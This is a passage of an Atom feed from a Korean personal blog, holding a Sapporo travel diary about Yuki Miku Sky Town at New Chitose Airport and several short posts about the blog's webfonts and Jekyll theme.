&lt;p&gt;&lt;img src=&quot;/images/2016_02/05/IMG_20160205_185914.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;징기즈칸을 굽기 전 모습. 고기가 맛없기는 어려운 일이지만 이건 특히 더 맛이 좋았다.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;이후 숙소에 들러 저녁을 먹기 전에 들른 면세점 ‘돈키호테’에서 샀던 다가시(막과자, 일명 불량식품)을 먹으며 밤을 보냈다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016_02/05/IMG_20160205_201404.jpg&quot; alt=&quot;&quot; /&gt; &lt;img src=&quot;/images/2016_02/05/IMG_20160205_201550.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;구매한 다가시들. 요즘 화제의 만화 ‘다가시카시’에서 소개되었던 바로 그 과자들이다.&lt;/span&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>삿포로 여행 1일차 - 신 치토세 공항, 유키미쿠 스카이타운</title>
   <link href="https://blog.gaonnr.me/trip/2016/02/04/Sapporo-Trip-1/"/>
   <updated>2016-02-04T00:00:00+09:00</updated>
   <id>https://blog.gaonnr.me/trip/2016/02/04/Sapporo-Trip-1</id>
   <content type="html">&lt;p&gt;친구 녀석들과 함께 삿포로 여행을 왔다. 2월 4일부터 11일까지, 9일간의 여행이다.&lt;/p&gt;

&lt;p&gt;작년에는 도쿄로 4박 5일 여행을 다녀왔는데, 사실상 여행 기간이 두배가 된 셈이다. 일정은 (다른 친구가) 어느 정도 세워 놓았지만, 날짜가 긴 만큼 얼마나 알차게 여행을 보낼 수 있을지는 잘 모르겠다. 그래도 명색이 세계 3대 축제라는 삿포로 눈 축제에 맞춰서 왔는데, 볼 거리가 많기를 바랄 뿐이다.&lt;/p&gt;

&lt;p&gt;오전 5시 40분경에 공항 리무진을 타고 인천 공항에 도착했다. 급하게 수속을 밟느라 공항 사진은 못 찍었다. 여차저차 수속을 전부 밟았더니 정확히 비행기 탑승 시간이 되어버렸다.&lt;/p&gt;

&lt;p&gt;비행기 안에서 좀 자려고 했었는데, 뒤에 있는 꼬맹이 둘이서 자꾸 의자를 퍽퍽 치더라…. 덕분에 계속 졸았다 깼다.&lt;/p&gt;

&lt;p&gt;다른 한 명의 친구가 비행기 표 예매를 제때 못해서 늦게 도착할 예정이었으므로, 홋카이도의 신 치토세 공항에 도착한 우리는 시간을 때우기 위해 공항 4층에 있는 유키미쿠 스카이타운으로 향했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016_02/04/IMG_20160204_122159.jpg&quot; alt=&quot;&quot; /&gt; &lt;img src=&quot;/images/2016_02/04/IMG_20160204_122242.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;유키미쿠 스카이타운의 모습. 역시 일본은 여러모로 대단한 나라다.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;하츠네 미쿠의 소속사(?)인 크립톤 퓨쳐 미디어가 홋카이도에 위치해 있어서 이런 홍보를 많이 한다는 얘기는 들었지만, 생각보다 크고 잘 꾸며져 있어서 깜짝 놀랐다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016_02/04/IMG_20160204_125505.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;벽과 기둥 등 곳곳에 유키미쿠의 일러스트들이 있었다.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016_02/04/IMG_20160204_125431.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;동전 교환기도 일러스트로 정성스럽게 꾸며 놓은 모습이 인상적이었다.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016_02/04/IMG_20160204_125650.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;화이트 보드를 설치해서 방문객들이 직접 뭔가를 채워넣을 수 있게 한 곳. 나도 뭔가 할까 했지만, 자리도 없고 부끄러워서 관뒀다.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;스카이타운의 바깥쪽은 거의 굿즈샵으로서, 유키미쿠를 모델로 내세운 쿠키라던가, 카라멜, 부채, 트럼프 카드, 안경수건, 유키미쿠다요… 등등을 팔고 있었는데, 역시 공식 굿즈인 만큼 상당히 퀄리티가 높은 것들이었다. 다만 실드쳐줄 수 없는 가격은…. 25% 정도만 할인했더라도 바로 지갑이 열렸을 것이다.&lt;/p&gt;

&lt;p&gt;그래도 나같은 보카로 팬들은 굿즈를 구경만 하더라도 기분이 좋을 것이라 생각한다. 굿즈에 사용된 일러스트 하나하나가 정말 예뻤다. (너무 예뻐서 구경만 하느라 사진을 못 찍었다.)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016_02/04/IMG_20160204_163636.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;유일하게 사진으로 남은 굿즈. 비닐&lt;em&gt;뒤에&lt;/em&gt;굿즈있어요.jpg&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;안쪽의 이름은 하츠네 미쿠 박물관. 미쿠가 뭐 하는 캐릭터이며, 어떻게 유키미쿠라는 캐릭터가 파생되었는지를 설명해주는 듯한 뉘앙스의 안내 멘트가 써져 있었으나, 한국어가 없고 일본어와 영어로만 적혀 있었기 때문에 일알못이자 영알못인 나는 제대로 이해할 수 없었다. 공부를 해야겠다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016_02/04/IMG_20160204_124524.jpg&quot; alt=&quot;&quot; /&gt; &lt;img src=&quot;/images/2016_02/04/IMG_20160204_124529.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;대략 우리&lt;em&gt;미쿠가&lt;/em&gt;이렇게_대단합니다.txt라는 느낌의 안내문들.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;박물관 안쪽으로 더 깊숙이 들어가니, 이때까지 나왔던 모든 유키미쿠의 피규어와 일러스트들이 전시되어 있는 공간이 나왔다. 나는 여기에 감격해서 사진을 계속 찍어댔다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016_02/04/IMG_20160204_124718.jpg&quot; alt=&quot;&quot; /&gt; &lt;img src=&quot;/images/2016_02/04/IMG_20160204_124746.jpg&quot; alt=&quot;&quot; /&gt; &lt;img src=&quot;/images/2016_02/04/IMG_20160204_124753.jpg&quot; alt=&quot;&quot; /&gt; &lt;img src=&quot;/images/2016_02/04/IMG_20160204_124801.jpg&quot; alt=&quot;&quot; /&gt; &lt;img src=&quot;/images/2016_02/04/IMG_20160204_124808.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;차례대로 2010년 ~ 2015년까지의 유키미쿠 넨도로이드. 조명 때문에 사진이 잘 나오진 않았다.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016_02/04/IMG_20160204_124820.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;유키미쿠는 아니지만, 내가 보자마자 어머 이건 사야 해! 라고 비명을 지르게 만든 하나이로 미쿠. 역시 사진이 좋진 않지만, 실물로 보니 샘플샷에서 많은 이들이 걱정하던 얼굴 조형도 상당히 예쁜 편이었다.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016_02/04/IMG_20160204_125121.jpg&quot; alt=&quot;&quot; /&gt; &lt;img src=&quot;/images/2016_02/04/IMG_20160204_125127.jpg&quot; alt=&quot;&quot; /&gt; &lt;img src=&quot;/images/2016_02/04/IMG_20160204_125134.jpg&quot; alt=&quot;&quot; /&gt; &lt;img src=&quot;/images/2016_02/04/IMG_20160204_125141.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;순서대로 2014년 ~ 2010년까지의 유키미쿠 일러스트. 2015년 일러스트는 HDR 보정 작업 중에 날아가 버렸다…&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016_02/04/IMG_20160204_125213.jpg&quot; alt=&quot;&quot; /&gt; &lt;img src=&quot;/images/2016_02/04/IMG_20160204_125301.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;기타 일러스트들.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;이후에도 같은 4층에 있던 게임 센터에서 시간을 때우다가, 다 같이 숙소에 도착해서 편의점식으로 저녁을 해결했다. 곳곳에서 ‘홋카이도 한정 판매’라고 당당하게 광고하던 유키미쿠 음료수도 사 마셨다. 맛은 녹인 뽕따맛. 음료수 색깔에서 바로 연상되는 정직한 맛이었다. 오늘의 여행 끝.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016_02/04/IMG_20160204_195246.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;italics&quot;&gt;‘홋카이도 한정’ 유키미쿠 음료수와 유키미쿠 카라멜. 솔직히 그냥 음료수랑 카라멜에다 유키미쿠 그림을 가져다 붙여서 파는 듯한 느낌이 들지만, 뭐 좋은 게 좋은 거 아니겠습니까.&lt;/span&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>본문용으로 웹폰트 (Kopub바탕) 적용했습니다.</title>
   <link href="https://blog.gaonnr.me/setting/2016/02/01/NewWebfont-Kopub/"/>
   <updated>2016-02-01T00:00:00+09:00</updated>
   <id>https://blog.gaonnr.me/setting/2016/02/01/NewWebfont-Kopub</id>
   <content type="html">&lt;p&gt;예전에 웹폰트를 추가했더니 사이트 접속이 느려지는 바람에 웹폰트를 날렸었는데, 갑자기 또 마음이 변해서 이정도면 괜찮지 않을까 해서 넣어봤어요.&lt;/p&gt;

&lt;p&gt;새로 넣은 웹폰트는 본문에만 적용되구요, Kopub바탕입니다.&lt;/p&gt;

&lt;p&gt;구글의 &lt;a href=&quot;https://www.google.com/fonts/earlyaccess&quot;&gt;Font Earlyaccess&lt;/a&gt;에서 따와서 적용했습니다.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>블로그 디자인 또 갈아엎었습니다.</title>
   <link href="https://blog.gaonnr.me/setting/2016/01/17/new-design/"/>
   <updated>2016-01-17T00:00:00+09:00</updated>
   <id>https://blog.gaonnr.me/setting/2016/01/17/new-design</id>
   <content type="html">&lt;p&gt;그전엔 Jekyll-Bootstrap을 썼습니다만, 왠지 어떻게 해야 할지를 잘 몰라서 뭔가 정보가 쬐끔 더 있어보이는 Jekyll-Now를 clone했어요. (이건 사실 제가 몰라서 그러는 거고, 좀만 배우면 이런거 상관없이 쓸듯한데)&lt;/p&gt;

&lt;p&gt;테마는 Lanyon Theme 적용했습니다. 본문 서체가 Serif체라 따로 설정 안한 윈도우 환경에서 어떻게 보일지 궁금하긴 한데. 괜찮겠죠 뭐.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>웹폰트 날렸습니다.</title>
   <link href="https://blog.gaonnr.me/setting/2016/01/03/deleted-webfonts/"/>
   <updated>2016-01-03T00:00:00+09:00</updated>
   <id>https://blog.gaonnr.me/setting/2016/01/03/deleted-webfonts</id>
   <content type="html">&lt;p&gt;원래는 Spoqa Han Sans KR/JP가 적용되어 있었는데요… 긱사에서 테스트해볼 때는 별로 문제점을 못 느꼈는데&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/182zoTTFxbNJK3L8mCDQjR8xS5um_Y2AyMy6h8VDUG2ECNCXz4O82Dos28WYLENfu-YL0XRcgiml3RFz5hC140RtWcgelQ9BMn-5N1qTaZnWZ-UmX_7F0hWw4303_af_eRojc-qPjX1tJOiH4SR_KlINqqSqVV6XlynG2R1L5anZhEm9dZ-T11R2tZ3GZHVyx-w5eHTfdRdXdOxS2GW98TIk0VHnTgVVZ8lKwN6qT_x0H1Eq1gUFtzblJijVdahw1N-Pue0zZRf-pUq6XDFDz-Dj7VHuytfZKk8izpE93OMXIDnBShUspd5zlNo69nLwuWoUGcQNKIePGZ8aMUd4RNIow3o0hTA6jaHgYtxzsyB7YhLvQXLGCKcu9GlzuwLdViIT6Tkviqy7O-zVcevxQYb5DfhcaLg76zNk9wcjMo83K9-kzEcxpLtbJetdDzxlK3HT1C5VhcIX1hUQYnGSwjlAWfxXUgG64zpc-XNM1bExPDNWmZB6g1_z0ydOI9wD76Wlo33nvj8Y0O8jbRYdryOgYFTMS801L1cSOPU7DDE0oOVauRC9KxxnShJoCNdTbQBJ=w596-h101-no&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;위 사진과 같이 웹폰트 덕분에 로딩이 무지막지하게 느려진다는 제보를 받아서 그냥 날리기로 했습니다 ㅠ&lt;/p&gt;

&lt;p&gt;여러분 웹브라우저 이쁜폰트 기본으로 설정하시고 쓰세요&lt;/p&gt;

&lt;p&gt;(아니면 맥 쓰던가)&lt;/p&gt;
</content>
 </entry>
 

</feed>
